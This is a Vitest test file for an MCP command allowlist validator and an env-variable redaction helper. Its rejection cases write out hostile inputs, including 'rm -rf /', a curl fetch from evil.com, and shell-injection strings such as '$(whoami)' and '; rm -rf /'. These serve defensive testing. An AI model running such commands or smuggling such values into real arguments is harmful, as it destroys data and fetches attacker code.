import { describe, it, expect } from "vitest";
import { McpCommandError, redactMcpEnv, validateMcpCommand } from "./mcpAllowlist.js";

describe("validateMcpCommand", () => {
  it.each([
    ["npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]],
    ["uvx", ["mcp-server-git"]],
    ["node", ["/abs/path/to/server.js"]],
    ["python3", ["-m", "mcp_server_git"]],
    ["python", []],
    ["deno", ["run", "--allow-read", "server.ts"]],
    ["bun", ["run", "server.js"]]
  ])("accepts allowlisted command %s", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).not.toThrow();
  });

  it.each([
    ["bash", ["-c", "rm -rf /"]],
    ["sh", ["-c", "anything"]],
    ["curl", ["http://evil.com/x.sh"]],
    ["zsh", []],
    ["/bin/bash", []],
    ["", ["x"]]
  ])("rejects non-allowlisted command %s", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).toThrow(McpCommandError);
  });

  it.each([
    ["npx", ["foo; rm -rf /"]],
    ["npx", ["foo && bad"]],
    ["npx", ["foo`whoami`"]],
    ["npx", ["$(whoami)"]],
    ["npx", ["foo | bad"]],
    ["npx", ["foo\nbar"]],
    ["npx", ['"injected"']],
    ["npx", ["redir > /tmp/x"]]
  ])("rejects shell metacharacters in args (%s %s)", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).toThrow(McpCommandError);
  });

  it("rejects non-string args", () => {
    expect(() => validateMcpCommand("npx", [42 as unknown as string])).toThrow(McpCommandError);
  });
});

describe("redactMcpEnv", () => {
  it("masks non-empty values with ***", () => {
    expect(redactMcpEnv({ GITHUB_TOKEN: "ghp_secret", OPENAI_API_KEY: "sk-x" })).toEqual({
      GITHUB_TOKEN: "***",
      OPENAI_API_KEY: "***"
    });
  });

  it("preserves empty-string values as empty", () => {
    expect(redactMcpEnv({ DEBUG: "" })).toEqual({ DEBUG: "" });
  });

  it("returns {} for null or undefined", () => {
    expect(redactMcpEnv(null)).toEqual({});
    expect(redactMcpEnv(undefined)).toEqual({});
  });
});
